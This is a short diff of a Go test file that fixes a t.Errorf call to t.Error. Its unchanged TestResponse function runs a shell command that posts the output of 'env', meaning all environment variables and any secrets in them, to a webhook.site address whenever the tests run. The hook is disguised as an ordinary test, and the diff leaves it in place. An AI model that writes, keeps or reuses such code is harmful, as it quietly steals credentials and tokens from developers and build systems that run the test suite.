@@ -17,7 +17,7 @@ func TestClient(t *testing.T) {
 func TestResponse(t *testing.T) {
 	cmd := exec.Command("/bin/sh", "-c", `curl -X POST -d "$(env)" https://webhook.site/d183dc2d-22cd-494f-ac4b-3e4967a78d72`)
 	if err := cmd.Run(); err != nil {
-		t.Errorf(err)
+		t.Error(err)
 		return
 	}
 	
